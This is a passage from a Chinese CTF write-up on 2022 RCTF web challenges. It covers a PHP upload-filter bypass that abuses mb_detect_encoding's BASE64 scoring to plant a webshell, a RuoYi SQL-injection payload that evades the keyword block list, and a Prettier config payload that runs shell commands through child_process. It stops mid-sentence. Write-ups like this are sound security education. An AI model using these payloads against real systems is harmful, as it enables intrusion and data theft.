<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">           <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                   <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的判断主要是有个<code>charset</code>的判断, 如果 <code>mb_detect_encoding()</code> 的结果不为空【<code>false !== $charset</code>】, 就会对文件内容进行判断，而当为空时【<code>false == $charset</code>】，就会直接返回退出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且在这段代码中有显示，不仅需要<code>$charset</code>不为空，还需要<code>$charset==&quot;BASE64&quot;</code></p>
<p>判断完<code>$charset</code>后，又对内容进行正则匹配，如果出现，就会失败了，所以需要在</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122163200935.png"><img src="/2022RCTF/image-20230122163200935.png" alt="image-20230122163200935"></a></p>
<p>这里匹配内容的代码为<code>stristr($content, $v)!==false</code></p>
<p><strong>stristr</strong></p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>它会导致奇怪的结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果发现</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>返回值</p>
<p>只有在<code>PHP</code>版本在<code>8.1.0 - 8.1.9</code>时会返回<code>base64</code>，而在其他版本都是默认识别为<code>ASCII</code></p>
<p>查看返回包中数据可知</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 22 Jan 2023 08:40:35 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.54 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.1.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br></pre></td></tr></table></figure>

<p>正好是<code>8.1.0 - 8.1.9</code>版本</p>
</blockquote>
<h4 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h4><blockquote>
<p>所以实现&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多，所以可以在一句话🐎前加入许多<code>/</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122195735469.png"><img src="/2022RCTF/image-20230122195735469.png" alt="image-20230122195735469"></a></p>
<p>这是<code>mb_encoding_detect()</code>返回判断得到编码类型的逻辑</p>
<blockquote>
<p>因为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code>，所以按照得分匹配，如果是想要返回<code>base64</code>，就需要内容中<code>base64</code>得分最高，才可以实现返回为<code>base64</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122195835984.png"><img src="/2022RCTF/image-20230122195835984.png" alt="image-20230122195835984"></a></p>
<h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a><strong>综上</strong></h3><blockquote>
<p>上传的文件需要满足</p>
<p>1.后缀不能为<code>.php</code>等，可以为大小写混写或者纯大写，如<code>.pHp，.PHP</code>等等</p>
<p>2.文件内容前面需要可以被识别为<code>base64</code>，而后面的过滤的内容其实就不用考虑了，因为在判断前经过</p>
<p><code>$content=base64_decode($content)</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122213729640.png"><img src="/2022RCTF/image-20230122213729640.png" alt="image-20230122213729640"></a></p>
<p>可以发现原来的内容在被解码后，发生了变化，结果转化为乱码，于是绕过了黑名单过滤</p>
<p>【当然前提是<code>$charset == BASE64</code>，也就是打分够了】</p>
</blockquote>
<p>于是最后的文件内容为</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122210900608.png"><img src="/2022RCTF/image-20230122210900608.png" alt="image-20230122210900608"></a></p>
<p>访问<code>1.PHP</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122210957493.png"><img src="/2022RCTF/image-20230122210957493.png" alt="image-20230122210957493"></a></p>
<p>拿蚁剑连接</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122164102078.png"><img src="/2022RCTF/image-20230122164102078.png" alt="image-20230122164102078"></a></p>
<p>最后得到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122164115830.png"><img src="/2022RCTF/image-20230122164115830.png" alt="image-20230122164115830"></a></p>
<h2 id="ezruoyi"><a href="#ezruoyi" class="headerlink" title="ezruoyi"></a>ezruoyi</h2><blockquote>
<p>hint:<code>RuoYi v4.7.5</code></p>
</blockquote>
<blockquote>
<p>附件：</p>
<p><code>https://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing</code></p>
<p>or</p>
<p><code>https://share.weiyun.com/wCvo3QJ0</code></p>
</blockquote>
<hr>
<blockquote>
<p>什么是RuoYi？</p>
<p>RuoYi是一个 <strong>Java EE 企业级快速开发平台</strong>，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。</p>
</blockquote>
<p>这个<code>ruoyi v4.75是</code>一个0day题目</p>
<p>搭建本地环境有问题，只有看看源码和师傅们的wp总结一下</p>
<hr>
<p>先进行信息收集，根据hint，查找ruoyiv 4.75以及其之前的常出现的漏洞点</p>
<p><a href="https://cn-sec.com/archives/1256773.html">https://cn-sec.com/archives/1256773.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/304666.html">https://www.freebuf.com/articles/web/304666.html</a></p>
<p>这两篇文章提到<code>Ruoyi&lt;=4.6.1</code>存在后台sql注入漏洞</p>
<p>对<code>ruoyi-admin.jar</code>包进行查找，</p>
<p>在 <code>ruoyi-generator-4.7.5.jar</code>找到<code>GenTablrServiceImpl.class</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230304225854115.png"><img src="/2022RCTF/image-20230304225854115.png" alt="image-20230304225854115"></a></p>
<p>其中的sql语句为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">create</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    SqlUtil.filterKeyword(sql);</span><br><span class="line">    List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);</span><br><span class="line">    List&lt;String&gt; tableNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (SQLStatement sqlStatement : sqlStatements) &#123;</span><br><span class="line">      <span class="keyword">if</span> (sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement) &#123;</span><br><span class="line">        <span class="type">MySqlCreateTableStatement</span> <span class="variable">createTableStatement</span> <span class="operator">=</span> (MySqlCreateTableStatement)sqlStatement;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.genTableService.createTable(createTableStatement.toString())) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> createTableStatement.getTableName().replaceAll(<span class="string">&quot;`&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">          tableNames.add(tableName);</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    List&lt;GenTable&gt; tableList = <span class="built_in">this</span>.genTableService.selectDbTableListByNames(tableNames.&lt;String&gt;toArray(<span class="keyword">new</span> <span class="title class_">String</span>[tableNames.size()]));</span><br><span class="line">    <span class="type">String</span> <span class="variable">operName</span> <span class="operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="string">&quot;loginName&quot;</span>));</span><br><span class="line">    <span class="built_in">this</span>.genTableService.importGenTable(tableList, operName);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现sql注入过滤判断，跟进<code>SqlUtil</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SqlUtil.filterKeyword(sql);</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruoyi.common.utils.sql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.exception.UtilException;</span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.utils.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlUtil</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9_\\ \\,\\.]+&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">escapeOrderBySql</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotEmpty(value) &amp;&amp; !isValidOrderBySql(value))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UtilException</span>(<span class="string">&quot;); </span></span><br><span class="line"><span class="string">    return value;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static boolean isValidOrderBySql(String value) &#123;</span></span><br><span class="line"><span class="string">    return value.matches(SQL_PATTERN);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static void filterKeyword(String value) &#123;</span></span><br><span class="line"><span class="string">    if (StringUtils.isEmpty(value))</span></span><br><span class="line"><span class="string">      return; </span></span><br><span class="line"><span class="string">    String[] sqlKeywords = StringUtils.split(SQL_REGEX, &quot;</span>\\|<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    for (String sqlKeyword : sqlKeywords) &#123;</span></span><br><span class="line"><span class="string">      if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) &gt; -1)</span></span><br><span class="line"><span class="string">        throw new UtilException(&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到正则过滤了很多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>开始还以为直接堵死了，但是它实际过滤的是<code>select_(空格)</code>，而非过滤了select，用<code>select/**/</code>可以进行绕过</p>
<p><a href="https://gitee.com/y_project/RuoYi/pulls/403">https://gitee.com/y_project/RuoYi/pulls/403</a></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230305002520151.png"><img src="/2022RCTF/image-20230305002520151.png" alt="image-20230305002520151"></a></p>
<p>在其<code>master</code>分支进行了<code>pull request</code>，对此处进行了修改，但是在main分支仍然存在旧代码的漏洞，所以仍然是可以利用的</p>
<p>而且分析前面方法</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement</span><br></pre></td></tr></table></figure>

<p>知道该方法是在<strong>create</strong>的时候触发，会先进行解析sql语句，然后进行创建表，如果创建表成功，则将表名添加到列表中</p>
<p>那么在一个创建表的sql语句中我们如何让它回显出我们需要的内容呢，</p>
<p>关键就在这里抛出异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">      <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>所以构造一个报错的表，且让其中包含flag数据</p>
<p>&#x3D;&gt;用报错注入查询flag的数据，然后把数据导入到创建的新表中去</p>
<p>所以于是根据构造</p>
<p>在网站<code>/tool/gen/createTable</code>以<code>post</code>方式提交<code>sql</code>语句</p>
<p>【注意表名不能和数据库已经有的表名相同否则会创建表失败】</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="keyword">create</span> <span class="keyword">table</span> a <span class="keyword">as</span> <span class="keyword">select</span><span class="comment">/**/</span>updatexml(<span class="number">0x7e</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230305005514205.png"><img src="/2022RCTF/image-20230305005514205.png" alt="image-20230305005514205"></a></p>
<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><blockquote>
<p>hint:<code>Prettier my(not your) code</code></p>
<p>附件：<a href="https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar">https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar</a></p>
</blockquote>
<blockquote>
<p>什么是Prettier？</p>
<p>一个“有态度”的<a href="https://www.prettier.cn/">代码格式化工具</a></p>
</blockquote>
<p>这个环境也有点问题，虽然能够完成搭建并且访问，但是调用<code>Prettier</code>时，对于身份的验证一直提示</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230217204716995.png"><img src="/2022RCTF/image-20230217204716995.png" alt="image-20230217204716995"></a></p>
<p>猜测是不是<code>Prettier</code>官方对公开可调用api进行了修改，导致在此题容器中无法运行<code>Prettier</code></p>
<p>只能记一下其他师傅的wp的知识点了【下次一定要现场搞出来，事后搞确实烦人</p>
<hr>
<p>这个题的思路有点头疼</p>
<p>这是官方配置文件介绍<a href="https://prettier.io/docs/en/configuration.html">https://prettier.io/docs/en/configuration.html</a></p>
<p>先看看环境文件，之前没学过<code>node.js</code>这次学习一下</p>
<h3 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a><code>index.js</code></h3><p>分析加在注释</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入文件系统、加密、格式化工具、进程控制等模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> prettier = <span class="built_in">require</span>(<span class="string">&#x27;prettier&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; nextTick, exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入自定义的 fw 模块</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./fw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件 ./dist/id 中读取一个字符串，然后使用 trim() 方法去除两端的空格</span></span><br><span class="line"><span class="keyword">const</span> id = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">toString</span>(<span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 删除文件 ./dist/id</span></span><br><span class="line">fs.<span class="title function_">unlinkSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 调用 prettier.resolveConfig 方法，异步地读取和解析 .prettierrc 配置文件，然后使用该配置文件格式化代码</span></span><br><span class="line"><span class="comment">//$&#123;__dirname&#125;是node.js的一个特殊变量，用于读取当前模块所在的目录的绝对路径</span></span><br><span class="line">prettier.<span class="title function_">resolveConfig</span>(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/.prettierrc`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 格式化当前文件的代码</span></span><br><span class="line">  <span class="keyword">const</span> ret = prettier.<span class="title function_">format</span>(fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&#x27;utf-8&#x27;</span>), config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用 SHA256 算法计算 id 的哈希值，并以十六进制格式输出为字符串</span></span><br><span class="line">  <span class="keyword">const</span> o = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(id, <span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_">digest</span>().<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 将 id 作为文件名写入 dist 目录下</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">`./dist/<span class="subst">$&#123;id&#125;</span>`</span>, o, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 将格式化后的代码写入文件 ./dist/ret.js 中</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;./dist/ret.js&#x27;</span>, ret, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 使用 nextTick 方法注册一个回调函数跑出一个错误</span></span><br><span class="line">  <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No NextTick here!&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>主要是对一个文件进行格式化、哈希计算并生成新的文件。</p>
<p>在这段代码中我们发现</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">resolveConfig</span><span class="params">(`$&#123;__dirname&#125;/.prettierrc`)</span></span></span><br></pre></td></tr></table></figure>

<p>.prettierrc文件实际上是不在当前目录，也就是说还未生成，那么我们利用其自身格式代码，让其加载我们自己的设置配置信息，实现想要的命令执行等等操作</p>
<h3 id="fw-js"><a href="#fw-js" class="headerlink" title="fw.js"></a>fw.js</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Module</span> = <span class="built_in">require</span>(<span class="string">&#x27;module&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> oldRequire = <span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span> = <span class="keyword">function</span> (<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> isCore = <span class="title class_">Module</span>.<span class="title function_">isBuiltin</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (isCore) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye, &#x27;</span> + id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    id = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(id, <span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> oldRequire.<span class="title function_">call</span>(oldRequire, id)</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="property">dlopen</span> = <span class="function">() =&gt;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是对参数进行过滤的一个模块，首先判断参数<code>id</code>是否为字符串类型，如果不是，则会抛出一个错误。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id))</span><br></pre></td></tr></table></figure>

<p>这里用<code>test(id)</code>,如果<code>id</code>是一个Node.js的核心模块，如<code>fs</code>、<code>path</code>、<code>util</code>或<code>os</code>等，则允许加载该模块，否则也会抛出一个错</p>
<p>误</p>
<p>另外，<code>process.dlopen</code>被重写为空函数，代表无法使用<code>process.dlopen</code>加载新的本地模块</p>
<blockquote>
<p><code>process.dlopen</code>是Node.js的一个C++层面的函数，用于在Node.js进程中动态加载本地模块</p>
</blockquote>
<h3 id="js-payload"><a href="#js-payload" class="headerlink" title="js payload"></a>js payload</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//解析.prettierrc</span></span><br><span class="line">  <span class="attr">parser</span>: <span class="string">&quot;.prettierrc&quot;</span>,</span><br><span class="line">  <span class="regexp">/x|x/</span>.<span class="property">__proto__</span>.<span class="property">test</span>=<span class="function">()=&gt;</span><span class="literal">true</span>,</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span>=<span class="function">()=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;pwd;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Hook RegExp.prototype.test</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码的目的就是因为在目录下并没有<code>.prettierrc</code>配置文件，所以利用解析器解析<code>.prettierrc，</code></p>
<p>那么</p>
